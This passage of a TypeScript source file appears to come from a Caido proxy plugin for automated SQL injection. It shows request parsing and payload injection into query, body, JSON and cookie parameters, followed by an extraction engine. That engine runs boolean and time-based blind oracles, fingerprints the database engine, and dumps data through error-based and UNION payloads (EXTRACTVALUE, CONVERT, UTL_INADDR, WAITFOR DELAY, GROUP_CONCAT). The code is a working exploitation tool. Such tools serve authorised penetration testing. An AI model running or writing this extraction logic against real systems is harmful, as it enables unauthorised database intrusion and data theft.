  if (Math.abs(baseLen - testLen) / Math.max(baseLen, testLen) > 0.5) {
    return { similar: false, ratio: lenRatio };
  }

  // Sample comparison for long strings
  const sampleSize = Math.min(1000, baseLen, testLen);
  const baseSample = baseline.substring(0, sampleSize);
  const testSample = testResponse.substring(0, sampleSize);

  let matches = 0;
  for (let i = 0; i < sampleSize; i++) {
    if (baseSample[i] === testSample[i]) matches++;
  }

  const ratio = (matches / sampleSize) * lenRatio;
  return { similar: ratio >= similarityThreshold, ratio };
}

// Parse raw HTTP request text into components
function parseRawRequest(rawText: string): { method: string; path: string; host: string; headers: Record<string, string>; body: string } | null {
  try {
    const lines = rawText.split(/\r?\n/);
    const firstLine = lines[0];
    const match = firstLine.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+([^\s]+)\s+HTTP/i);
    if (!match) return null;

    const method = match[1].toUpperCase();
    const path = match[2];
    const headers: Record<string, string> = {};
    let host = "";
    let bodyStart = -1;

    for (let i = 1; i < lines.length; i++) {
      const line = lines[i];
      if (line.trim() === "") {
        bodyStart = i + 1;
        break;
      }
      const colonIdx = line.indexOf(":");
      if (colonIdx > 0) {
        const key = line.substring(0, colonIdx).trim();
        const value = line.substring(colonIdx + 1).trim();
        headers[key] = value;
        if (key.toLowerCase() === "host") host = value;
      }
    }

    const body = bodyStart > 0 ? lines.slice(bodyStart).join("\n") : "";
    return { method, path, host, headers, body };
  } catch {
    return null;
  }
}

// Extract scan parameters straight from raw HTTP request text — the SAME source
// injectIntoRaw edits — so query/body/cookie names, values and types line up exactly
// with what gets injected. Avoids the structured accessors (getQuery() returns a
// string in this SDK, so the old object-iteration path silently found nothing).
function paramsFromRaw(rawText: string): ParamInfo[] {
  const params: ParamInfo[] = [];
  const parsed = parseRawRequest(rawText);
  if (!parsed) return params;

  // Form-URL decode (so values re-encode cleanly when injectIntoRaw rebuilds via
  // URLSearchParams); fall back to the raw token if it isn't valid %-encoding.
  const dec = (s: string) => { try { return decodeURIComponent(s.replace(/\+/g, " ")); } catch { return s; } };

  // Query params from the request-line path
  const qIdx = parsed.path.indexOf("?");
  if (qIdx !== -1) {
    const queryStr = parsed.path.substring(qIdx + 1);
    for (const part of queryStr.split("&")) {
      if (!part) continue;
      const eq = part.indexOf("=");
      const name = eq === -1 ? part : part.substring(0, eq);
      const value = eq === -1 ? "" : part.substring(eq + 1);
      if (name) params.push({ name: dec(name), value: dec(value), type: "query" });
    }
  }

  // Body params — JSON first, then URL-encoded
  const body = (parsed.body || "").trim();
  if (body) {
    let handled = false;
    try {
      const json = JSON.parse(body);
      for (const p of extractNestedParams(json)) params.push(p);
      handled = true;
    } catch { /* not JSON */ }
    if (!handled) {
      for (const part of body.split("&")) {
        if (!part) continue;
        const eq = part.indexOf("=");
        const name = eq === -1 ? part : part.substring(0, eq);
        const value = eq === -1 ? "" : part.substring(eq + 1);
        if (name) params.push({ name: dec(name), value: dec(value), type: "body" });
      }
    }
  }

  // Cookie params (header name is case-insensitive)
  const cookieKey = Object.keys(parsed.headers).find(k => k.toLowerCase() === "cookie");
  if (cookieKey) {
    for (const part of parsed.headers[cookieKey].split(";")) {
      const seg = part.trim();
      if (!seg) continue;
      const eq = seg.indexOf("=");
      const name = eq === -1 ? seg : seg.substring(0, eq);
      const value = eq === -1 ? "" : seg.substring(eq + 1);
      if (name) params.push({ name, value, type: "cookie" });
    }
  }

  return params;
}

// Inject a payload into a specific parameter within raw HTTP request text
function injectIntoRaw(rawText: string, paramName: string, paramType: string, value: string): string {
  const parsed = parseRawRequest(rawText);
  if (!parsed) return rawText;
  const normalizedCRLF = rawText.includes("\r\n");
  const lines = rawText.split(/\r?\n/);
  const enc = (v: string) => encodeURIComponent(v);

  if (paramType === "query") {
    const qIdx = parsed.path.indexOf("?");
    const base = qIdx >= 0 ? parsed.path.substring(0, qIdx) : parsed.path;
    const qs = new URLSearchParams(qIdx >= 0 ? parsed.path.substring(qIdx + 1) : "");
    qs.set(paramName, value);
    lines[0] = lines[0].replace(parsed.path, `${base}?${qs.toString()}`);
  } else if (paramType === "cookie") {
    for (let i = 1; i < lines.length; i++) {
      if (lines[i].trim() === "") break;
      if (lines[i].toLowerCase().startsWith("cookie:")) {
        lines[i] = lines[i].replace(
          new RegExp(`(${paramName}=)[^;]*`),
          `$1${value}`
        );
      }
    }
  } else if (paramType === "body" || paramType === "json") {
    let bodyStart = -1;
    for (let i = 1; i < lines.length; i++) {
      if (lines[i].trim() === "") { bodyStart = i + 1; break; }
    }
    if (bodyStart > 0) {
      const body = lines.slice(bodyStart).join("\n");
      let newBody = body;
      try {
        const json = JSON.parse(body);
        setNestedValue(json, paramName, value);
        newBody = JSON.stringify(json);
      } catch {
        const params = new URLSearchParams(body);
        params.set(paramName, value);
        newBody = params.toString();
      }
      const head = lines.slice(0, bodyStart);
      // Update Content-Length if present
      for (let i = 1; i < head.length; i++) {
        if (head[i].toLowerCase().startsWith("content-length:")) {
          head[i] = `Content-Length: ${utf8Encode(newBody).length}`;
        }
      }
      return [...head, newBody].join(normalizedCRLF ? "\r\n" : "\n");
    }
  }
  return lines.join(normalizedCRLF ? "\r\n" : "\n");
}

// Non-blocking sleep (backoff between retries). setTimeout exists in the Caido
// runtime (confirmed in reference plugins); if it ever isn't, resolve immediately.
function delay(ms: number): Promise<void> {
  return new Promise((resolve) => {
    try { (globalThis as any).setTimeout(resolve, ms); } catch { resolve(); }
  });
}

async function sendRequest(
  requestId: string,
  paramName: string,
  paramType: string,
  injectedValue: string,
  rawRequest?: string,
  sid: string = "",
  maxAttempts: number = 3
): Promise<{ body: string; status: number; time: number } | null> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  try {
    let url = "";
    let injected = "";

    if (requestId) {
      // ---- Saved request path: edit raw bytes via RequestSpecRaw ----
      const result = await sdk.requests.get(requestId);
      if (!result?.request) return null;
      const request = result.request;

      const isTls = request.getTls?.() ?? false;
      const host = request.getHost?.() || "";
      const port = request.getPort?.() || (isTls ? 443 : 80);
      url = `${isTls ? "https" : "http"}://${host}:${port}`;

      // Grab current raw bytes from the request
      let rawText = "";
      if (typeof request.getRaw === "function") {
        const rb = request.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb?.toBytes ? rb.toBytes() : rb);
      } else if (typeof request.toSpecRaw === "function") {
        const sr = request.toSpecRaw();
        const rb = sr.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb);
      }

      injected = injectIntoRaw(rawText, paramName, paramType, injectedValue);
    } else if (rawRequest) {
      // ---- Raw paste path: build a RequestSpecRaw ----
      injected = injectIntoRaw(rawRequest, paramName, paramType, injectedValue);
      const parsed = parseRawRequest(rawRequest);
      if (!parsed) return null;
      const isHttps = (parsed.headers["X-Scheme"] || "").toLowerCase() === "https"
        || (parsed.headers["x-forwarded-proto"] || "").toLowerCase() === "https";
      const hasPort = parsed.host.includes(":");
      const port = hasPort ? parseInt(parsed.host.split(":")[1]) : (isHttps ? 443 : 80);
      const hostname = parsed.host.split(":")[0];
      url = `${port === 443 || isHttps ? "https" : "http"}://${hostname}:${port}`;
    } else {
      return null;
    }

    const encoded = utf8Encode(injected);

    // Send with retries on transient errors (timeouts/connection resets) so a flaky or slow
    // target doesn't kill the whole scan on one request (e.g. the baseline).
    let lastErr: any = null;
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      if (isAborted(sid)) return null;
      const startTime = Date.now();
      try {
        const specRaw = new RequestSpecRaw(url);
        specRaw.setRaw(encoded);
        const resp = await sdk.requests.send(specRaw);
        return {
          body: resp.response?.getBody()?.toText() || "",
          status: resp.response?.getCode() || 0,
          time: Date.now() - startTime,
        };
      } catch (e: any) {
        lastErr = e;
        const msg = String(e?.message || e);
        const transient = /timeout|timed out|connection|reset|refused|operationfailed|temporarily/i.test(msg);
        if (!transient || attempt === maxAttempts) break;
        sendLog(`    [retry ${attempt}/${maxAttempts - 1}] ${msg.slice(0, 70)} — retrying...`, "warn");
        // Back off before retrying so a slow/overloaded target has time to recover
        // (immediate retries after a timeout usually hit the same wall). 600ms, 1.2s, ...
        if (isAborted(sid)) return null;
        await delay(600 * attempt);
      }
    }
    const stack = (lastErr?.stack || "").split("\n").slice(0, 3).join(" | ");
    sendLog(`[DEBUG] sendRequest error: ${lastErr?.message || lastErr} @ ${stack}`, "error");
    return null;
  } catch (e: any) {
    const stack = (e?.stack || "").split("\n").slice(0, 3).join(" | ");
    sendLog(`[DEBUG] sendRequest error: ${e?.message || e} @ ${stack}`, "error");
    return null;
  }
}

function setNestedValue(obj: any, path: string, value: string): void {
  const parts = path.split(".");
  let current = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    const key = parts[i];
    const arrMatch = key.match(/^(\w+)\[(\d+)\]$/);
    if (arrMatch) {
      current = current[arrMatch[1]][parseInt(arrMatch[2])];
    } else {
      if (!(key in current)) current[key] = {};
      current = current[key];
    }
  }
  const lastKey = parts[parts.length - 1];
  const arrMatch = lastKey.match(/^(\w+)\[(\d+)\]$/);
  if (arrMatch) {
    current[arrMatch[1]][parseInt(arrMatch[2])] = value;
  } else {
    current[lastKey] = value;
  }
}

function extractNestedParams(obj: any, prefix: string = ""): ParamInfo[] {
  const params: ParamInfo[] = [];

  if (Array.isArray(obj)) {
    obj.forEach((item, index) => {
      if (typeof item === "object" && item !== null) {
        params.push(...extractNestedParams(item, `${prefix}[${index}]`));
      } else {
        params.push({
          name: `${prefix}[${index}]`,
          value: String(item),
          type: "json",
        });
      }
    });
  } else if (typeof obj === "object" && obj !== null) {
    for (const [key, value] of Object.entries(obj)) {
      const fullKey = prefix ? `${prefix}.${key}` : key;
      if (typeof value === "object" && value !== null) {
        params.push(...extractNestedParams(value, fullKey));
      } else {
        params.push({
          name: fullKey,
          value: String(value),
          type: "json",
        });
      }
    }
  }

  return params;
}

// ==================== EXTRACTION ENGINE ====================

const CHARSET = "|"; // multi-row delimiter

// Send a payload: original value + the given tail (which already contains prefix/suffix).
// Mirrors scan-time shape `${origValue}${prefix}...${suffix}`.
async function sendVectorPayload(v: InjectionVector, tail: string, sid: string = "") {
  const fullValue = `${v.origValue}${tail}`;
  return sendRequest(v.requestId, v.param, v.paramType, fullValue, v.rawRequest, sid);
}

// Build the parameter tail for a boolean/inference condition using the vector's prefix/suffix
function buildConditionValue(v: InjectionVector, condition: string): string {
  return `${v.prefix}AND ${condition}${v.suffix}`;
}

interface BlindRefs {
  trueBody: string;
  falseBody: string;
  baseTime: number;
  cutoff: number;        // similarity-to-trueBody threshold separating TRUE from FALSE pages
  reliable: boolean;     // did the boolean oracle validate cleanly (pages separate AND charFn probe OK)?
  pagesSeparate: boolean; // do TRUE/FALSE pages separate at all? (oracle works, maybe wrong DBMS)
}

// Establish TRUE/FALSE reference responses for boolean blind + a timing baseline, and
// VALIDATE the oracle so we don't binary-search against noise. We measure:
//   simTrueSelf  = similarity(trueBody, a 2nd independent TRUE page)  → page self-noise (~1.0)
//   simFalseTrue = similarity(trueBody, falseBody)                    → TRUE vs FALSE page (low)
// The decision cutoff sits midway between them; a small gap means the oracle can't tell
// TRUE from FALSE here (dynamic page / false-positive finding) → reliable=false.
async function establishRefs(v: InjectionVector, sid: string = ""): Promise<BlindRefs | null> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  const t = await sendVectorPayload(v, buildConditionValue(v, "1=1"), sid);
  const f = await sendVectorPayload(v, buildConditionValue(v, "1=2"), sid);
  if (!t || !f) return null;
  const baseTime = Math.min(t.time, f.time);

  if (v.technique === "time") {
    return { trueBody: t.body, falseBody: f.body, baseTime, cutoff: 0.5, reliable: true, pagesSeparate: true };
  }

  // Second independent TRUE sample to gauge page self-noise, and a known-FALSE control.
  const t2 = await sendVectorPayload(v, buildConditionValue(v, "2=2"), sid);
  const simTrueSelf = t2 ? pageSimilarity(t.body, t2.body) : 1;
  const simFalseTrue = pageSimilarity(t.body, f.body);
  const cutoff = (simTrueSelf + simFalseTrue) / 2;
  const pagesSeparate = (simTrueSelf - simFalseTrue >= 0.12) && simTrueSelf >= 0.6;
  const refs: BlindRefs = { trueBody: t.body, falseBody: f.body, baseTime, cutoff, reliable: true, pagesSeparate };

  // Pages must separate at all.
  if (!pagesSeparate) {
    refs.reliable = false;
    sendLog(`    [oracle] boolean pages don't separate on ${v.param} (true-self ${(simTrueSelf * 100).toFixed(0)}% vs true/false ${(simFalseTrue * 100).toFixed(0)}%)`, "warn");
    return refs;
  }

  // Validate the ACTUAL extraction machinery: run charFn on a known literal ('Z' = 90)
  // through a must-be-true and a must-be-false comparison. If the false probe reads TRUE
  // (the classic "every char = 127" failure — comparison payloads erroring to a page that
  // isn't the FALSE page), the boolean oracle can't drive extraction here.
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  const probeExpr = meta.charFn("'Z'", "1");
  const probeTrue = await evalCondition(v, refs, `${probeExpr}>65`, 5, sid);
  const probeFalse = await evalCondition(v, refs, `${probeExpr}>100`, 5, sid);
  if (!(probeTrue && !probeFalse)) {
    refs.reliable = false;
    sendLog(`    [oracle] boolean extraction probe failed on ${v.param} (true→${probeTrue}, false→${probeFalse}); comparison payloads not reflected`, "warn");
  }
  return refs;
}

// Evaluate a boolean condition through the current vector. Returns true/false.
async function evalCondition(v: InjectionVector, refs: BlindRefs, condition: string, timeSec = 5, sid: string = ""): Promise<boolean> {
  if (v.technique === "time") {
    const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
    let payload: string;
    if (v.dbms === "mssql") {
      payload = `${v.prefix}IF(${condition}) WAITFOR DELAY '0:0:${timeSec}'${v.suffix}`;
    } else {
      payload = `${v.prefix}AND ${meta.sleepIf(condition, timeSec)}${v.suffix}`;
    }
    const r = await sendVectorPayload(v, payload, sid);
    if (!r) return false;
    return r.time >= (refs.baseTime + timeSec * 1000 - 1200);
  }
  // boolean / error / union → stable single-reference threshold (robust to two-ratio noise).
  const r = await sendVectorPayload(v, buildConditionValue(v, condition), sid);
  if (!r) return false;
  const simTrue = pageSimilarity(refs.trueBody, r.body);
  return simTrue >= refs.cutoff;
}

// Binary-search one character's ASCII code at position `pos` of sqlExpr
async function extractChar(v: InjectionVector, refs: BlindRefs, sqlExpr: string, pos: number, timeSec: number, sid: string = ""): Promise<number> {
  const throwIfAborted = () => _throwIfAborted(sid);
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  const charExpr = meta.charFn(sqlExpr, String(pos));
  let lo = 0, hi = 127;
  while (lo < hi) {
    throwIfAborted();
    const mid = Math.floor((lo + hi) / 2);
    const greater = await evalCondition(v, refs, `${charExpr}>${mid}`, timeSec, sid);
    if (greater) lo = mid + 1; else hi = mid;
  }
  return lo;
}

// Get the length of sqlExpr via binary search
async function extractLength(v: InjectionVector, refs: BlindRefs, sqlExpr: string, timeSec: number, sid: string = ""): Promise<number> {
  const throwIfAborted = () => _throwIfAborted(sid);
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  const lenExpr = meta.lengthFn(sqlExpr);
  // Exponential upper bound then binary search
  let hi = 1;
  while (await evalCondition(v, refs, `${lenExpr}>${hi}`, timeSec, sid)) {
    throwIfAborted();
    hi *= 2;
    if (hi > 4096) break;
  }
  let lo = 0;
  while (lo < hi) {
    throwIfAborted();
    const mid = Math.floor((lo + hi) / 2);
    const greater = await evalCondition(v, refs, `${lenExpr}>${mid}`, timeSec, sid);
    if (greater) lo = mid + 1; else hi = mid;
  }
  return lo;
}

// Build a DBMS error payload that forces `~<value>~` into the error message for a given sub-expression.
function errorMarkerPayload(dbms: string, innerExpr: string): string {
  switch (dbms) {
    case "mysql":
      // EXTRACTVALUE truncates ~32 chars; caller chunks. Marker via 0x7e (~)
      return `EXTRACTVALUE(1,CONCAT(0x7e,(${innerExpr}),0x7e))`;
    case "mssql":
      return `CONVERT(INT,(SELECT '~'+CAST((${innerExpr}) AS NVARCHAR(4000))+'~'))`;
    case "postgresql":
      return `CAST((SELECT '~'||(${innerExpr})::text||'~') AS INT)`;
    case "oracle":
      return `(SELECT UTL_INADDR.GET_HOST_ADDRESS('~'||(${innerExpr})||'~') FROM DUAL)`;
    default:
      return `EXTRACTVALUE(1,CONCAT(0x7e,(${innerExpr}),0x7e))`;
  }
}

// Try to retrieve a scalar value by reflection (error marker or UNION). Returns null if nothing reflected.
async function extractReflected(v: InjectionVector, sqlExpr: string, sid: string = ""): Promise<string | null> {
  if (v.technique === "error") {
    if (v.dbms === "mysql" || v.dbms === "unknown") {
      // Chunked retrieval: EXTRACTVALUE/UPDATEXML truncate at ~32 chars
      let result = "";
      let offset = 1;
      const chunk = 30;
      for (let guard = 0; guard < 200; guard++) {
        const inner = `SELECT SUBSTRING((${sqlExpr}),${offset},${chunk})`;
        const payload = `${v.prefix}AND ${errorMarkerPayload("mysql", inner)}${v.suffix}`;
        const r = await sendVectorPayload(v, payload, sid);
        if (!r) break;
        const val = markerValue(r.body, payload);   // null = nothing, or just our payload reflected
        if (val === null) break;
        result += val;
        if (val.length < chunk) break;
        offset += chunk;
      }
      return result.length > 0 ? result : null;
    }
    // MSSQL / PostgreSQL / Oracle: no truncation — one request with embedded marker
    const payload = `${v.prefix}AND ${errorMarkerPayload(v.dbms, sqlExpr)}${v.suffix}`;
    const r = await sendVectorPayload(v, payload, sid);
    if (r) {
      const val = markerValue(r.body, payload);
      if (val !== null) return val;
    }
    return null;
  }
  if (v.technique === "union") {
    const concat = v.dbms === "mssql"
      ? `'~'+CAST((${sqlExpr}) AS NVARCHAR(4000))+'~'`
      : v.dbms === "postgresql" || v.dbms === "oracle"
      ? `'~'||(${sqlExpr})||'~'`
      : `CONCAT(0x7e,(${sqlExpr}),0x7e)`;
    const payload = `${v.prefix}UNION ALL SELECT ${concat}${v.suffix}`;
    const r = await sendVectorPayload(v, payload, sid);
    if (r) {
      const val = markerValue(r.body, payload);
      if (val !== null) return val;
    }
    return null;
  }
  return null;
}

// Main scalar extraction: reflect-first, binary-search fallback
async function extractValue(v: InjectionVector, sqlExpr: string, refs: BlindRefs | null, timeSec: number, sid: string = ""): Promise<string> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  // 1) Reflected (fast)
  if (v.technique === "error" || v.technique === "union") {
    const reflected = await extractReflected(v, sqlExpr, sid);
    if (reflected !== null) return reflected;
  }
  // 2) Blind binary search
  if (!refs) return "";
  const len = await extractLength(v, refs, sqlExpr, timeSec, sid);
  if (len === 0) return "";
  let out = "";
  for (let pos = 1; pos <= len; pos++) {
    throwIfAborted();
    const code = await extractChar(v, refs, sqlExpr, pos, timeSec, sid);
    out += String.fromCharCode(code);
    sendLog(`    retrieved: ${out}`, "verbose");
  }
  return out;
}

// Retrieve multiple rows of a single-column query
async function extractMultiRow(v: InjectionVector, baseSql: string, refs: BlindRefs | null, timeSec: number, rowCap: number, sid: string = ""): Promise<string[]> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const meta = DBMS_META[v.dbms] || DBMS_META.mysql;
  // Reflected: one-shot aggregation
  if (v.technique === "error" || v.technique === "union") {
    // Wrap baseSql's selected column into an aggregation. baseSql is "SELECT col FROM ...".
    const m = baseSql.match(/^SELECT\s+(.+?)\s+FROM\s+([\s\S]+)$/i);
    if (m) {
      const col = m[1];
      const rest = m[2];
      const aggExpr = v.dbms === "mysql"
        ? `(SELECT GROUP_CONCAT(${col} SEPARATOR 0x7c) FROM ${rest})`
        : v.dbms === "postgresql"
        ? `(SELECT string_agg(${col}::text,'|') FROM ${rest})`
        : v.dbms === "mssql"
        ? `(SELECT STRING_AGG(CAST(${col} AS NVARCHAR(MAX)),'|') FROM ${rest})`
        : `(SELECT LISTAGG(${col},'|') WITHIN GROUP (ORDER BY ${col}) FROM ${rest})`;
      const joined = await extractValue(v, aggExpr, refs, timeSec, sid);
      if (joined) return joined.split("|").filter(x => x.length > 0).slice(0, rowCap);
    }
  }
  // Blind: count rows then fetch each by offset
  if (!refs) return [];
  const count = parseInt(await extractValue(v, meta.countRows(baseSql), refs, timeSec, sid) || "0", 10);
  const n = Math.min(isNaN(count) ? 0 : count, rowCap);
  const rows: string[] = [];
  for (let i = 0; i < n; i++) {
    throwIfAborted();
    const rowSql = meta.rowLimit(baseSql, i);
    const val = await extractValue(v, `(${rowSql})`, refs, timeSec, sid);
    rows.push(val);
    sendLog(`[+] row ${i + 1}/${n}: ${val}`, "success");
  }
  return rows;
}

// Identify the DBMS through the boolean oracle using functions unique to each engine.
// Each probe is TRUE only where that function exists and behaves as expected; on other
// engines it errors → FALSE page. Order matters (test the most specific first).
async function fingerprintDbmsBlind(v: InjectionVector, refs: BlindRefs, sid: string = ""): Promise<string | null> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  // [name, mustBeTrue, mustBeFalse]. Requiring a matching FALSE probe rejects engines that
  // mask SQL errors into a generic page (where the error itself would read as TRUE).
  const probes: Array<[string, string, string]> = [
    ["mysql", "ORD('A')=65", "ORD('A')=66"],                       // ORD/MID → MySQL
    ["mssql", "LEN('abc')=3", "LEN('abc')=4"],                     // LEN → MSSQL/Sybase
    ["oracle", "BITAND(5,1)=1", "BITAND(5,1)=2"],                  // BITAND → Oracle
    ["sqlite", "SQLITE_VERSION()>'0'", "SQLITE_VERSION()>'999'"],  // SQLITE_VERSION() → SQLite
    ["postgresql", "('a'||'b')='ab'", "('a'||'b')='az'"],         // || string concat → PostgreSQL
  ];
  for (const [name, condT, condF] of probes) {
    throwIfAborted();
    if (await evalCondition(v, refs, condT, 5, sid) && !(await evalCondition(v, refs, condF, 5, sid))) {
      sendLog(`[+] Back-end DBMS identified via blind fingerprint: ${name.toUpperCase()}`, "success");
      return name;
    }
  }
  return null;
}

// Opportunistically find a TIME-BASED oracle on an already-confirmed injection point, by
// replaying real conditional-delay payloads (every DBMS) through the known prefix/suffix and
// keeping the first that produces a clear, repeatable delay. Lets extraction work on pages too
// dynamic for boolean inference, without the user re-scanning with the Time technique.
async function deriveTimeVector(v: InjectionVector, sid: string = ""): Promise<InjectionVector | null> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const timeSec = 5;
  const baseR = await sendVectorPayload(v, `${v.prefix}AND 1=1${v.suffix}`, sid);
  const baseTime = baseR ? baseR.time : 700;
  const need = baseTime + timeSec * 1000 - 1500;
  sendLog(`[*] Probing for a time-based oracle on ${v.param} (no page-content dependency)...`, "info");
  for (const [dbms, payloads] of Object.entries(TIME_PAYLOADS)) {
    for (const { payload } of payloads as Array<{ payload: string; title: string }>) {
      throwIfAborted();
      const tail = `${v.prefix}${replacePayloadPlaceholders(payload, timeSec)}${v.suffix}`;
      const r = await sendVectorPayload(v, tail, sid);
      if (r && r.time >= need) {
        const r2 = await sendVectorPayload(v, tail, sid); // confirm (reject network jitter)
        if (r2 && r2.time >= need) {
          sendLog(`[+] Time-based oracle found (${dbms.toUpperCase()}) — delay ${r2.time}ms`, "success");
          return { ...v, technique: "time", dbms };
        }
      }
    }
  }
  sendLog(`[!] No time-based oracle responded on ${v.param}.`, "warn");
  return null;
}

// Propagate a discovered DBMS to the stored vector and all its sibling techniques.
function setVectorDbms(v: InjectionVector, dbms: string) {
  v.dbms = dbms;
  const key = vectorKey(v.requestId, v.param);
  for (const x of confirmedVectorsAll[key] || []) if (x.dbms === "unknown") x.dbms = dbms;
  const best = confirmedVectors[key];
  if (best && best.dbms === "unknown") best.dbms = dbms;
}

// Choose the most reliable extraction vector for (requestId, param) and build its refs.
// Reflected (error/union) → no refs. Boolean → validated oracle (blind-fingerprinting the
// DBMS if needed), else fall back to a confirmed time-based vector. Returns null if unusable.
async function prepareExtraction(
  requestId: string,
  param: string | undefined,
  timeSec: number,
  sid: string = ""
): Promise<{ v: InjectionVector; refs: BlindRefs | null } | null> {
  const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
  const throwIfAborted = () => _throwIfAborted(sid);
  const candidates = pickVectors(requestId, param);
  if (candidates.length === 0) {
    sendLog(`[!] No confirmed injection point. Run a scan first.`, "error");
    return null;
  }

  for (const v of candidates) {
    throwIfAborted();
    if (v.technique === "error" || v.technique === "union") {
      sendLog(`[*] Extracting via ${v.technique.toUpperCase()} (${v.dbms}) on param ${v.param}`, "info");
      return { v, refs: null };
    }
    if (v.technique === "boolean") {
      let refs = await establishRefs(v, sid);
      if (refs && refs.reliable) {
        sendLog(`[*] Extracting via BOOLEAN (${v.dbms}) on param ${v.param}`, "info");
        return { v, refs };
      }
      // Oracle works (pages separate) but the charFn probe failed — almost always because
      // the DBMS is unknown/misidentified. Fingerprint it blind, correct it, and re-validate.
      if (refs && refs.pagesSeparate) {
        const fp = await fingerprintDbmsBlind(v, refs, sid);
        if (fp && fp !== v.dbms) {
          setVectorDbms(v, fp);
          refs = await establishRefs(v, sid);
          if (refs && refs.reliable) {
            sendLog(`[*] Extracting via BOOLEAN (${v.dbms}) on param ${v.param}`, "info");
            return { v, refs };
          }
        }
      }
      // Still not reliable — prefer a time-based vector if one was confirmed.
      const timeV = candidates.find(c => c.technique === "time");
      if (timeV) {
        if (timeV.dbms === "unknown" && v.dbms !== "unknown") setVectorDbms(timeV, v.dbms);
        sendLog(`[*] Boolean oracle unreliable here — switching to TIME-BASED (${timeV.dbms}) [slower but accurate]`, "warn");
        const tr = await establishRefs(timeV, sid);
        if (tr) return { v: timeV, refs: tr };
      }
      // No time fallback: use the boolean oracle best-effort with a warning.
      if (refs && refs.pagesSeparate) {
        sendLog(`[!] Proceeding with low-confidence boolean inference (DBMS ${v.dbms}; results may be unreliable)`, "warn");
        return { v, refs };
      }
    }
    if (v.technique === "time") {
      const refs = await establishRefs(v, sid);
      if (refs) {
        sendLog(`[*] Extracting via TIME-BASED (${v.dbms}) on param ${v.param} [slower but accurate]`, "info");
        return { v, refs };
      }
    }
  }
  // Last resort: the page is too dynamic for boolean inference, but the param is injectable —
  // try to discover a time-based oracle automatically (no re-scan needed).
  const seed = candidates.find(c => c.technique === "boolean") || candidates[0];
  if (seed) {
    const tv = await deriveTimeVector(seed, sid);
    if (tv) {
      recordVector(tv);
      const tr = await establishRefs(tv, sid);
      if (tr) {
        sendLog(`[*] Extracting via TIME-BASED (${tv.dbms}) on param ${tv.param} [slower but accurate]`, "info");
        return { v: tv, refs: tr };
      }
    }
  }
  sendLog(`[!] Could not establish a reliable extraction oracle for this param.`, "error");
  sendLog(`[i] The page is too dynamic for boolean inference and no time-based delay responded. If you know the DBMS, verify the injection is still live, or try another confirmed parameter.`, "warn");
  return null;
}

export function init(sdkInstance: any) {
  sdk = sdkInstance;

  // Diagnostic: list available methods on request/spec/sdk.requests
  sdk.api.register("probe", async (_sdk: any, requestId: string) => {
    const out: any = {};
    try {
      out.sdkRequests = Object.getOwnPropertyNames(sdk.requests || {});
    } catch (e: any) { out.sdkRequestsErr = String(e); }
    try {
      const result = await sdk.requests.get(requestId);
      const request = result?.request;
      if (request) {
        const proto = Object.getPrototypeOf(request);
        out.requestMethods = proto ? Object.getOwnPropertyNames(proto) : Object.getOwnPropertyNames(request);
        try {
          const spec = request.toSpec?.();
          if (spec) {
            const sp = Object.getPrototypeOf(spec);
            out.specMethods = sp ? Object.getOwnPropertyNames(sp) : Object.getOwnPropertyNames(spec);
          } else {
            out.toSpec = "returned nothing";
          }
        } catch (e: any) { out.toSpecErr = String(e); }
        out.hasToSpecRaw = typeof request.toSpecRaw;
        out.hasGetRaw = typeof request.getRaw;
        out.hasGetQuery = typeof request.getQuery;
        out.hasGetBody = typeof request.getBody;
      } else {
        out.noRequest = true;
      }
    } catch (e: any) { out.getErr = String(e); }
    return out;
  });

  // Lightweight request metadata for tab labels (method + path)
  sdk.api.register("getMeta", async (_sdk: any, requestId: string) => {
    try {
      const result = await sdk.requests.get(requestId);
      const req = result?.request;
      if (!req) return { method: "", path: "", host: "" };
      const method = req.getMethod?.() || "";
      let path = req.getPath?.() || "";
      if (!path && typeof req.getRaw === "function") {
        const rb = req.getRaw();
        const raw = typeof rb === "string" ? rb : utf8Decode(rb?.toBytes ? rb.toBytes() : rb);
        const m = raw.match(/^[A-Z]+\s+([^\s?]+)/);
        if (m) path = m[1];
      }
      return { method, path, host: req.getHost?.() || "" };
    } catch (e) {
      return { method: "", path: "", host: "" };
    }
  });

  // Get parameters from request
  sdk.api.register("getParams", async (_sdk: any, requestId: string) => {
    const result = await sdk.requests.get(requestId);
    if (!result?.request) {
      throw new Error("Request not found");
    }

    const request = result.request;
    const params: ParamInfo[] = [];
    const seen = new Set<string>();
    const add = (p: ParamInfo) => {
      const key = `${p.type}|${p.name}`;
      if (seen.has(key)) return;
      seen.add(key);
      params.push(p);
    };

    sendLog(`[DEBUG] Parsing request ${requestId}`, "verbose");

    // PRIMARY: parse the raw request bytes (same source injectIntoRaw edits) so the
    // displayed names/values/types match the wire exactly.
    let rawText = "";
    try {
      if (typeof request.getRaw === "function") {
        const rb = request.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb?.toBytes ? rb.toBytes() : rb);
      } else if (typeof request.toSpecRaw === "function") {
        const sr = request.toSpecRaw();
        const rb = sr.getRaw();
        rawText = typeof rb === "string" ? rb : utf8Decode(rb);
      }
    } catch (e) {
      sendLog(`[DEBUG] getRaw error: ${e}`, "verbose");
    }

    let rawHadBody = false;
    if (rawText) {
      const rawParams = paramsFromRaw(rawText);
      for (const p of rawParams) { add(p); if (p.type === "json" || p.type === "body") rawHadBody = true; }
      sendLog(`[DEBUG] Parsed ${rawParams.length} param(s) from raw request`, "verbose");
    }

